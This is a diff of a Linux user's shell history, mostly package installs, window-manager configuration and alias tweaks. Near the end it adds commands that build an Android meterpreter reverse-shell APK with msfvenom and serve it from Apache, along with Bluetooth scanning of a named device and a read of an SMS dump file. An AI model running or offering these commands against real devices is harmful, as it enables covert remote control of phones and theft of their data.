@@ -1,500 +1,500 @@
-lf
-ranger
-cd pictures/
-wal -i surface.jpg 
-cd pic
-cd pictures/
-wal -i surface.jpg 
-arandr
-htop
+timeshift
+timeshift --list-shapshots
+sudo timeshift --list-shapshots
+sudo timeshift --list-shapshots
+sudo timeshift --list
+zsh
+sudo pacman -Runs zsh
+paclist
+pacman -Runs zsh
+sudo pacman -Runs zsh
+sudo pacman -Rns zsh
+sudo pacman -Rns zsh-completions zsh
+listapps.sh 
+pacclean
+pacman -Qqdt
+uninst olive
+uninst menumaker
+paclist
+clear
 ls
-ls
-arandr
-chi
-vim .dotfiles/.config/i3/config 
-vim .dotfiles/.config/i3/config 
-vim .dotfiles/.config/i3/config 
-inst clipster
-yay -S clipster
-yay -S roficlip
-roficlip
-clipster
-clipster -h
-clipster -c
-systemctl start clipste
-clipster -d
-clipster -d &
-clipster -c
-clipster -c
-clipster -h
-clipster -s
-[A
-[A
-clipster -s
-[A
-sudo pacman -Runs clipster rofi-clip
-sudo pacman -Runs clipster
-sudo pacman -Qdt
-sudo pacman -Runs roficlip
-pacman -Rns $(pacman -Qtdq)
-sudo pacman -Rns $(pacman -Qtdq)
-pacman -Qe
-pacman -Qen
-pacman -Qem
-yay -Runs clipster
-pacman -Qem
-sudo pacman -Syuu
-ls
-htop
-lwwdir 
-sh gitScript.sh 
-code
-cd pictures/
-wal -i surface.jpg 
-wal -i surface.jpg 
-htop
-kill tint2
-killall tint2
-code .dotfiles/.config/i3/config 
-cd .config/i3
-ls
-ls -alt
- notify-send
- notify-send test
-pacman -S dunst
-alttab -d 1
-xdotool keyup alt
-cat /var/log/Xorg.0.log
-code .dotfiles/.config/i3/config 
-alttab -d 1
-cd .config
-ls
-git add 
-cd ..
-cd .dotfiles/
-gid add 
-git status
-git add .config/i3/config 
-git commit
-git commit -m "manjaro"
-git push 
-git push 
-pacman -S dunst
-sudo pacman -S dunst
-notify-send test
-dunst
-htop
-pacman -Syyu
-sudo pacman -Syyu
-sudo pacman -Syyu
-y
-y
-sudo pacman -Syy
-ping 10.0.5.
-ping 10.0.5.2
-ping 10.0.2.15
-ipaddr
-ip addr
-pkill virtualbox
-ps -eaf | grep vbox
-ps -eaf | grep box
-pkill VirtualBox
-ip addr
-ip link set enp4s0 up
-sudo ip link set enp4s0 up
-ip addr
-sudo ip link set 2 up
-sudo ip link set enp4s0 up
-sudo ip link status enp4s0
-ip link show dev enp4s0
-sudo ip link set enp4s0 down
-sudo ip link set enp4s0 up
-ip link show dev enp4s0
-sudo pacman -Syy shotcut
-sudo pacman -Syy shotcut
-sudo pacman -Syyu
-cd /var/cache/pacman/pkg/
-rm -rf /var/cache/pacman/pkg/*
-sudo rm -rf /var/cache/pacman/pkg/*
-sudo pacman -Syyu
-pacman-key --refresh-keys
-sudo pacman-key --refresh-keys
- sudo pacman-key --init
-sudo pacman-key --populate
-sudo pacman-key --refresh-keys
-sudo pacman -Syyu
-sudo pacman -Ss kden
-sudo pacman -Sy kdenlive
-sudo pacman -Syyu 
-.fzf
-pacman -S fzf
-sudo pacman -S fzf
-fzf
-pacman -Q | fzf
-pacman -Ss shotcut
-sudo pacman -Sy shotcut
-pacman -Qen
-pacman -Qsn
-pacman -Q --help
-pacman -Ql kdenlive
-fzf
-fzf .
-ff
-vim .bashrc 
-sudo pacman -Sy davinci
-sudo pacman -Runs davinci-resolve
-sudo pacman -S fsearch
-yay -S fsearch
-yay -S fsearch-git
-fsearch
-yay -S davinci-resolve
-yay -S davinci-resolve
-yay -S davinci-resolve
-sudo vim /etc/pacman.conf 
-yay -S davinci-resolve
-sudo pacman -Syy
-yay -S davinci-resolve
-sudo pacman -Syyu
-yay -S davinci-resolve
-sudo vim /etc/pacman.conf 
-sudo pacman -S lib32-libpng12
-sudo vim /etc/pacman.conf 
-sudo pacman -Syyu
-sudo pacman -S lib32-libpng12
-sudo pacman -S lib32-libpng12
-sudo vim /etc/pacman.conf 
-fg
-sudo pacman -Syyu
-sudo pacman -S lib32-libpng12
-yay -S davinci-resolve
-yay -S davinci-resolve
-man zathura
-zathura --help
-man zathura
-inst zathura-pdf-poppler
-tabbed 
-inst tabbed
-yay -S tabbed
-man tabbed
-tabbed zathura
-tabbed zathura
-sudo pacman -Runs zathura*
-sudo pacman -Runs zathura
-pacman -Q | grep zathura
-sudo pacman -Runs zathura zathura-pdf-poppler
-pacman -Q | grep zathura
-inst mupdf
-inst gimp
-sudo pacman -S vlc
-inst mpv
-inst imagemagick
-inst sxiv
-inst zathura
-pkill kdenlive
-htop
-yay -S ttf-ms-fonts
-pkill chromium
-pkill firefox
-dmenu
-dmenu-run
-dmenu run
-drun
-dmenu --help
-dmenu -l 10
-man dmenu
-dmenu
-dmenu -p
-pacman -S youtube-dl
-sudo pacman -S youtube-dl
-cd .config/
-ls
-cd /etc/
-sudo updatedb
-locate youtube-dl.conf
-locate youtube-dl
-vim youtube-dl.conf
-sudo vim youtube-dl.conf
-youtube-dl https://www.youtube.com/watch?v=rjacJY1DogU
-pkill chromium
-pkill chromium
-htop
-pkill kdenlive
-bash "/home/suadmin/.dotfiles/.config/i3/config"
-inst brave
-sudo pacman -Ss brave
-pacman -Ss brave
-sudo pacman -Runs firefox
-pacman -Q | dmenu
-pacman -Q | dmenu
-dmenu_run
-pacman -S gnome-keyring-daemon
-sudo pacman -S gnome-keyring-daemon
-yay -S gnome-keyring-daemon
-yay -S awesome rofi picom i3lock-fancy xclip ttf-roboto gnome-polkit materia-gtk-theme lxappearance flameshot pnmixer network-manager-applet xfce4-power-manager -y
-pacman -S awesome picon i3lock-fancy xclip ttf-roboto 
-sudo pacman -S awesome picon i3lock-fancy xclip ttf-roboto 
-sudo pacman -S awesome picom xclip ttf-roboto 
-yay -S gnome-polkit materia-gtk-theme lxappearance flameshot pnmixer network-manager-applet xfce4-power-manager -y
-pacman -S gnome-polkit
-sudo pacman -S gnome-polkit
-yay -S gnome-polkit
-yay -S awesome rofi picom i3lock-fancy xclip ttf-roboto gnome-polkit materia-gtk-theme lxappearance flameshot pnmixer network-manager-applet xfce4-power-manager -y
-pacman -Q | grep awesome
-git clone https://github.com/PapyElGringo/material-awesome.git ~/.config/awesome
-man alttab
-man picom
-man alttab
-echo run | dmenu -fn 10x20 | exec bash -s
-run | dmenu -fn 10x20 | exec bash -s
-echo run | dmenu -fn 10x20 | exec bash -s
-dmenu_run  
-dmenu_run  -fn 10x20
-dmenu_run  
-sudo pacman -S autokey
-yay -S autokey
- 
-autokey-run 
-git clone https://github.com/madslundt/keybindings/tree/master/linux/autokey ~/Downloads/
-git clone https://github.com/madslundt/keybindings/tree/master/linux/autokey ~/.config/autokey/data
-git clone https://github.com/madslundt/keybindings.git
-ls
-cd Downloads/
-cd 
-ls
-cd .config/
-mkdir autokey
-cd autokey/
-ls
-mkdir data
-git status
-cd .config/
-cd ..
-ls -alt
-cd .dotfiles/
-git status
-$ mkdir -p ~/.config/awesome/
-mkdir -p ~/.config/awesome/
-cp /etc/xdg/awesome/rc.lua ~/.config/awesome/
-htop
-htop
-inst nitrogen
-ls
-cd pictures/
-cd Pic
-..
-cd ..
-cd Pictures/
-ls
-ranger
-weather
-cd .dotfiles/
-ls
-cat lwwcommands 
-lcmd
-cat sxhkdrc 
-cat gitScript.sh 
-cd scripts/
-cat lwwappslist.txt 
-pacman -Qq
-pacman -Qq | less
-pacman -Qq | fzf
-echo alttab-git > lwwappslist.txt 
-cat lwwappslist.txt 
-git pull
-git checkout master
-git pull origin master
-git pull rebase
-
-git pull --ff
-cat lwwappslist.txt 
-git pull origin master
-git pull master
-git pull origin
-git pull --rebase origin
-git stash
-git pull --rebase origin
-cat lwwappslist.txt 
-echo alttab-git >> lwwappslist.txt 
-cat lwwappslist.txt 
-cd ..
-ls
-lla
-vim .bash_aliases 
-cl
-ls
-cd .dotfiles/
-lla
-cat .bashrc
-vim .bash_aliases 
-cd .config/ranger/
-ls
+dd
+ds
+cd -
 ll
-ls -alt
-fzf 
-fzf /
-find /
-find / | fzf
-cp -i /usr/share/doc/ranger/config/rc.conf ~/.config/ranger/
-sncli
-cd 
-lwwdir 
+ll
 lla
-cd .config/
-cd i3
-vim config 
-IIIi
-vim .config/i3/config 
-vim .config/i3/config 
-feh --bg-scale --randomize ~/Pictures/wallpapers
-feh --bg-scale --randomize ~/Pictures/wallpapers/*
-pcmanfm
-inst pcmanfm
-pcmanfm
+du
+lwwdir 
+vim lwwcommands 
+inst xrvt-unicode
+pacman -Ss xrvt
+pacman -Ss rvt
+pacman -Ss
+pacman -Ss st
+pacman -Ss rxvt
+inst rxvt-unicode
+pacman -Ss dash-to-panel
+pacman -Ss dash
+inst lxpanel
+pkill lxpanel
+uninst lxpanel
+pacclean
+inst xfce4-panel
+inst perlpanel
+yay -S perlpanel-git
+inst cairo-dock
+pkill cairo-dock
+uninst cairo-dock
+inst xfce4-panel
+inst polybar
+pacman -Ss polybar
+pacman -Ss poly
+pacman -Ss poly |fzf
+inst polybar-git
+yay -S polybar-git
+locate polybar
+pkill xfce4-panel
+uninst xfce4-panel
+sudo pacman -Rns rxvt-unicode
+vim /etc/pacman.conf
+pacman -S steam
+inst steam
+sudo pacman -Sy
+inst steam
+lspci -v
+$ lspci -v | grep -A1 -e VGA -e 3D
+$ lspci -v | grep -A1 -e VGA 
+lspci -v | grep -A1 -e VGA -e 3D
+pacman -Ss xf86-video
+mnt
 lsblk
-mount
-vim .config/i3/config 
-fg
-htop
+cd /mnt/
 ls
-cd Music
-ls
-youtube-dl -x --audio-format mp3 https://www.youtube.com/watch?v=KxwUy2S2n-Q
-ls
-ls
-ll
-cd /home/suadmin/Videos/
-ls
-pwd
-inst pv
-pv
-ls
-cd Pictures/
-ls
-mkdir wallpapers
-git clone https://gitlab.com/dwt1/wallpapers.git
-ls
-cd wallpapers/
-ls
-ll
-git clone https://gitlab.com/dwt1/wallpapers.git
-ls
-ll
-git clone https://gitlab.com/dwt1/wallpapers.git
-pkill fsearch
-homemonitor.sh 
-xrandr
-lwwdir 
-cd scripts/
-vim homemonitor.sh 
-homemonitor.sh 
-vim homemonitor.sh 
-sncli
-sncli
-sncli
-xmodmap -pke
-xmodmap -pke | fzf
-lwwdir 
-vim .xmodmap 
-xmodmap .xmodmap 
-man i3status
-htop
-cd .config/i3
+cd windows
 ls
 cd ..
+cd windows
+cd
+cd /mnt/windows2/
+l
+ll
 ls
-cd i3status/
-vim config 
-lwwdir 
-vim .xmodmap
-xmodmap .xmodmap 
-vim homemonitor.sh 
-vim .xmodmap
-xmodmap .xmodmap 
-vim .xmodmap
-cd scripts/
-vim link_install.sh 
-bash ./link_install.sh 
+cd /windows10/
+ls
 cd 
+cd /
+ls
+cd windows10/
 lla
-lwwdir 
-lla
-cd scripts/
-vim link_install.sh 
+cd 
+homemonitor.sh 
+cd /windows10/
+ls
 cd ..
-vim .bashrc 
+cd /mnt/
+ls
+cd windows
+ls
 lla
+cd 
+cd /mnt/
+lla
+mount
+mount -l
+ls -al /mnt/
+mount 
+lsblk
+cd /run/media/suadmin/
+ls
+cd A2EECDADEECD7A55/
+lla
+cd Windows/
+cd Fonts/
+cd ..
+mkdir /usr/share/fonts/WindowsFonts
+sudo mkdir /usr/share/fonts/WindowsFonts
+cp Fonts/* /usr/share/fonts/WindowsFonts/
+sudo cp Fonts/* /usr/share/fonts/WindowsFonts/
+ls
+cd /usr/share/fonts/
+ls
+chmod 644 ./WindowsFonts/
+sudo chmod 644 ./WindowsFonts/
+fc-cache --force
+fc-cache --help
+fc-cache -fv
+steam
+bash norc
+bash --norc
+bash
+hostname
+echo $hostname
+echo $HOSTNAME
+vimgolf
+[ -e $HOME/.bash_aliases ] && source $HOME/.bash_al
+    iases || ln -sf $HOME/.dotfiles/.bash_aliases $HOME
+    iases || ln -sf $HOME/.dotfiles/.bash_aliases $HOME
+[ -e $HOME/.bash_aliases ] && source $HOME/.bash_al
+    iases || ln -sf $HOME/.dotfiles/.bash_aliases $HOME
+[ -e $HOME/.bash_aliases ] && source $HOME/.bash_al
+[ -e $HOME/.bash_aliases ] && source $HOME/.bash_aliases || ln -sf $HOME/.dotfiles/.bash_aliases $HOME/.bash_aliases && source $HOME/.bash_aliases
+[ -e $HOME/.bash_aliases ] && source $HOME/.bash_aliases || ln -sf $HOME/.dotfiles/.bash_aliases $HOME/.bash_aliases && source $HOME/.bash_aliases
+strace
+stract --t bash
+stract -tt bash
+strace -tt bash
+strace -tt bash | grep access
+strace -tt -fo strace.log bash | grep access
+cat strace.log 
+cd /private
+script -t script.log 2>script.tim -c 'bash -x -c "
+    for ((i=3;i--;));do sleep .1;done
+
+    for ((i=2;i--;)) ;do
+        tar -cf /tmp/test.tar -C / bin
+        gzip /tmp/test.tar
+        rm /tmp/test.tar.gz
+    done
+"'
+ls -l script.*
+sudo updatedb
+sudo updatedb
+sudo updatedb
+strace -tt -fo strace.log bash | grep access
+strace -tt -fo strace.log bash
+sudo strace -tt -fo strace.log bash
+sudo -Rns bash-completion
+exit
+exit
+exit
+strace -tt
+strace -tt bash
+exit
+echo exit | strace bash -li |& grep '^open'
+echo exit | strace -tt bash -li |& grep '^open'
+echo exit | strace bash -li |& grep '^open'
+echo exit | strace bash -li |& grep '^open'
+sudo strace -tt -fo strace.log bash
+exit
+exit
+echo exit | strace bash -li |& grep '^open'
+exit
+exit
+exit
+exit
+exit
+exit
+exit
+echo exit | strace -tt bash -li |& grep '^open'
+echo exit | strace -tt -fo strace.log bash
+cat strace.log 
+cat strace.log | grep open
+echo exit | strace bash -li |& grep '^open'
+echo exit | strace -tt -fo strace.log bash -li
+cat strace.log | grep open
+cat .bash_history 
+cat strace.log | grep open
+echo exit | strace bash -li |& grep '^open'
+echo exit | strace -t bash -li |& grep '^open'
+echo exit | strace  bash -li |& grep '^open'
+echo exit | strace -tt -fo strace.log bash -li |& grep '^open'
+cat strace.log | grep open
+strace -tt -fo strace.log bash
+cat strace.log | grep open
+echo exit | strace bash -li |& grep '^open'
+exit
+echo exit | strace bash -li |& grep '^open'
 vim .bash_profile 
 vim .bashrc
+sourche .bashrc
+source .bashrc
+vim .bashrc
+exit
+exit
+bash -v
+vim .bash_aliases 
+vim .bashrc
+source .bashrc
+vim .bashrc
+source .bashrc
+vim .bashrc
+source .bashrc
+echo exit | strace bash -li |& grep '^open'
+vim .bash_prori
+vim .bash_profile 
+vim .bashrc
+echo exit | strace bash -li |& grep '^open'
+vim .bash_aliases 
+echo exit | bash -v
+echo exit | bash -v
+bash -v
+source .bashrc
+bash -v
+ls
+source
+source bashrc
+source .bashrc
+xrandr --output LVDS1 --brightness 0.8
+xrandr --output LVDS1 --brightness 0.7
+source .bashrc
+xrandr --output LVDS1 --brightness 0.8
+xrandr --output LVDS1 --brightness 0.5
+source .bashrc
+xrandr --output LVDS1 --brightness 1
+alias mnt="mount | awk -F' ' '{ printf \"%s\t%s\n\",\$1,\$3; }' | column -t | egrep ^/dev/ | sort"
+mnt
+alias mnt='mount | awk -F' ' '{ printf \"%s\t%s\n\",\$1,\$3; }' | column -t | egrep ^/dev/ | sort'
+alias mnt='mount | awk -F' ' "{ printf \"%s\t%s\n\",\$1,\$3; }" | column -t | egrep ^/dev/ | sort'
+alias mnt='mount | awk -F' ' '{ printf \"%s\t%s\n\",\$1,\$3; }' | column -t | egrep ^/dev/ | sort'
+alias mnt='mount | awk -F' ' "{ printf \"%s\t%s\n\",\$1,\$3; }" | column -t | egrep ^/dev/ | sort'
+alias mnt='mount | awk -F" " "{ printf \"%s\t%s\n\",\$1,\$3; }" | column -t | egrep ^/dev/ | sort'
+mnt
+mount | grep -E ^/dev | column -t
+mount | awk -F' ' '{ printf \"%s\t%s\n\",\$1,\$3; }' | column -t | egrep ^/dev/ | sort
+alias mnt = 'mount | awk -F' ' '{ printf \"%s\t%s\n\",\$1,\$3; }' | column -t | egrep ^/dev/ | sort'
+alias mnt="mount | awk -F' ' '{ printf \"%s\t%s\n\",\$1,\$3; }' | column -t | egrep ^/dev/ | sort"
+mnt
+unalias mnt
+mnt
+alias mnt="mount | awk -F' ' '{ printf \"%s\t%s\n\",\$1,\$3; }' | column -t | egrep ^/dev/ | sort"
+mnt
+time alias mnt="mount | awk -F' ' '{ printf \"%s\t%s\n\",\$1,\$3; }' | column -t | egrep ^/dev/ | sort"
+alias mnt="mount | awk -F' ' '{ printf \"%s\t%s\n\",\$1,\$3; }' | column -t | egrep ^/dev/ | sort"
+alias mnt="mount | awk -F' ' '{ printf \"%s\t%s\n\",\$1,\$3; }' | column -t | egrep ^/dev/ | sort"
+alias mnt="mount | awk -F' ' '{ printf \"%s\t%s\n\",\$1,\$3; }' | column -t | egrep ^/dev/ | sort"
+alias mnt="mount | awk -F' ' '{ printf \"%s\t%s\n\",\$1,\$3; }' | column -t | egrep ^/dev/ | sort"
+alias mnt="mount | awk -F' ' '{ printf \"%s\t%s\n\",\$1,\$3; }' | column -t | egrep ^/dev/ | sort"
+cat .bash_aliases 
+alias brightness="xrandr --output VGA1 --brightness 0.8"
+alias lcmd='cat ~/.dotfiles/lwwcommands'
+alias lwwdir='cd ~/.dotfiles/'
+alias ll='ls --human-readable --size -1 --classify'
+alias lla='ls -A --human-readable --size -1 --classify'
+alias inst='sudo pacman -S'
+alias uninst='sudo pacman -Runs'
+alias pacclean='sudo pacman -Runs $(pacman -Qqdt)'
+alias pacsearch='pacman -Ss'
+alias fs='find ~ | fzf'
+alias paclist='pacman -Qq | fzf'
+alias fpkg='pacman -Qq | grep'
+alias i3config='vim ~/.config/i3/config'
+alias bashreload='source ~/.bashrc && echo Bash config reloaded'
+time alias fs='find ~ | fzf'
+time alias fs="find ~ | fzf"
+unalias fs
+time alias fs="find ~ | fzf"
+unalias *
+ll
+time alias fs="find ~ | fzf"
+vim .bash_aliases 
+cd .dotfiles/
 cd scripts/
-bash ./link_install.sh 
-cd  
-lwwdir 
-git status
-git add .xmodmap 
-git commit
-git commit -m xmodmap
-git push origin master
-lwwdir
-xmodmap .xmodmap 
-xmodmap .xmodmap 
-xmodmap .xmodmap 
-xmodmap .xmodmap 
-killalll xmodmap
-vim test
-touch test
-xmodmap test
-xmodmap .xmodmap 
-xmodmap -pke
-xmodmap -pke|fzf
-cd 
+cd ..
 lla
-vim .xmodmap 
-cat .xmodmap 
-cat .bashrc
-which xsel
-man dmenu
+bash ./gitScript.sh 
+bash -v
+vim .bash_aliases 
+source .bashrc
+vim .bash_aliasses
+vim .bash_aliass
+vim .bash_aliases 
+vim .bash_aliases 
+vim .bash_aliases 
+alsamixer
+cd /proc/
+cat cpuinfo 
+yay -S proton
+pacman -S wine
+sudo pacman -S wine
+yay -S proton
+yay -S proton
+ps
+ps -eaf | code
+ps -eaf | grep code
+ps -eaf | grep gordon
+pkill steam
+ps -eaf | grep steam
+kill -9 -1
+source .bashrc
+brightness 
+vim .bash_aliases 
+vim .bash_aliases 
+pacman -Sy plasma-desktop
+vim .bashrc
+source .bashrc
+vim .bash_aliases 
+source .bashrc
+brightness 1
+brightness 0.8
+xrandr --output LVDS1 --brightness 1
+xrandr --output LVDS1 --brightness 0.5
+source .bashrc 
+brightness 
+source .bash
+source .bashrc
+brightness 
+xrandr --output LVDS1 --brightness 0.5
+kill -9 -1
+pkill steam
+nm-applet 
+networkctl 
+NetworkManager
+sudo NetworkManager
+inst plasma-nm
+uninst plasma-desktop
+pacclean 
+sudo updatedb
+locate plasma
+rm -rf /usr/share/plasma/
+sudo rm -rf /usr/share/plasma/
+sudo updatedb
+locate plasma
+locate plasma | less
+sudo pacman -Sy --reinstall dolphin
+sudo pacman -Sy dolphin --reinstall
+sudo pacman -Sy dolphin
+dolphin 
+kill -9 -1
+pkill picom
+pacman -R dolphin
+htop
+cd .dotfiles/
+git pull
+git config pull.rebase true
+git pull
+git config pull.ff only
+git pull
+git fetch
+git status
+git pull
+git stash
+git status
+git pull
+git status
+apt list
+apt list i3-gaps
 vim .config/i3/config 
-xsel -o | dmenu -p Calculate: | xargs echo | calc -p | xargs dmenu -p
-cheat xsel
-cheat rofi
-printf "Choice1\nChoice2\nChoice3" | rofi -dmenu
+cat .config/i3/config 
+vim .config/i3/config 
+git stash
+git pull
+sudo apt-get lxpanel
+sudo apt search lx
+sudo apt search lx-panel
+sudo apt search lxpanel
+sudo apt install lxpanel
+xmodmap
+xmodmap --help
+fzf
+xmodmap -pk
+xmodmap -pke
+xmodmap -pke | fzf
+uname -r
+uname -a
+man i3
+i3 border normal
+#for_window [class="^.*"] border pixel 2
+for_window [class="^.*"] border pixel 2
+i3 for_window [class="^.*"] border pixel 2
+i3 for_window [class="^.*"] border normal
+i3 for_window \[class="^.*"\] border normal
+i3 for_window \[class=\"^.*\"\] border normal
+cd .dotfiles/scripts/homemonitor.sh 
+cd .dotfiles/scripts/
+bash homemonitor.sh 
+sudo apt-get upgrade
+sudo apt-get update
+sudo apt-get upgrade
+ifconfig
+ip addr
+msfvenom --help
+nsfvenon -p --list
+msfvenom -p --list
+msfvenom --list
+msfvenom --list payloads
+hciconfig
+hciconfig hci0 up
+sudo hciconfig hci0 up
+hciconfig
+hcitool scan
+hcitool name E0:37:17:7A:18:D4
+mac = E0:37:17:7A:18:D4
+mac="E0:37:17:7A:18:D4"
+echo $mac
+hcitool inq $mac
+hcitool inq E0:37:17:7A:18:D4
+hcitool inq E0:37:17:7A:18:D4 2
+hcitool inq --length=2 E0:37:17:7A:18:D4 
+hcitool inq
+man sdptool
+sdptool browse $mac
+hcitool inq
+l2pint $mac
+l2ping $mac
+sudo l2ping $mac
+btscanner
+btscanner
+sudo apt install btscanner
+btscanner
+btscanner help
+btscanner --help
+bt-device --list
+sudo /etc/init.d/bluetooth start
+systemctl enable bluetooth
+sudo systemctl enable bluetooth
+systemctl status bluetooth
+hciconfig
+hciconfig inq
+hciconfig scan
+hcitool scan
+btscanner --help
+btscanner
+btscanner
+btscanner
 ls
-lla
-ll | rofi
-ll | dmenu
-man dmenu
-ll | dmenu -l 10
-dmenu_run
-dmenu_run -l 10
-dmenu_run -li 10
-dmenu_run -l -i 10
-dmenu_run -il  10
-dmenu_run -i -l 10
-dmenu -i -l 10
-dmenu_run -i -l 10
-dmenu_run -i -l 10
-dmenu_desktop -i -l 10
-dmenu_path | dmenu -nb '#303030' -nf '#8f8f8f' -sb '#303030' -sf '#e0e0e0'
-dmenu_path
-man dmenu_path
-which dmenu_path 
-cheat dmenu_path
-lwwdir
-git status
-rm -rf test 
-git commit 
-git commit -a
-git commit -a
-git commit -a
-git add 
+cat sms_dump_20210116050728.txt 
+htop
+sudo apt install armitage
+armitage
+nexpose
+sudo shutdown
+sudo shutdown -c
+sudo reboot -s
+shutdown --help
+sudo reboot
+ifconfig
+ip addr
+msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=4444 R>/var/www/html/ehacking.apk
+sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=4444 R>/var/www/html/ehacking.apk
+sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=4444 R> /var/www/html/ehacking.apk
+sudo chown -R $USER:$USER /var/www
+sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.10 LPORT=4444 R> /var/www/html/ehacking.apk
+service apache2 status
+systemctl status apache2
+systemctl start apache2
+systemctl status apache2
+msfconsole
+msfconsole
+lxpanel
+sudo apt search lxdpanel
+apt search lxdtpanel
+apt search lxpanel
+apt search lxdepanel
+apt search lxde-panel
+apt search panel
+sudo apt install lxdpanel
+sudo apt install lxpanel
+pkill -9 -1
+kill -9 -1
+sudo apt install dolphin
+sudo apt install pcmanfm
 ls
-bash gitScript.sh 
-vim gitScript.sh 
-xev
-xmodmap .xmodmap 
-xmodmap .xmodmap 
-xmodmap .xmodmap 
-xmodmap .xmodmap 
-xmodmap .xmodmap 
-xmodmap .xmodmap 
-xmodmap -pke  | fzf
+rm -rf reconspider/
+ls
+sudo rm -rf reconspider/
+cd tryhackme/
+ls
+pkill tint2
+pkill lxpanel
+lxpanel
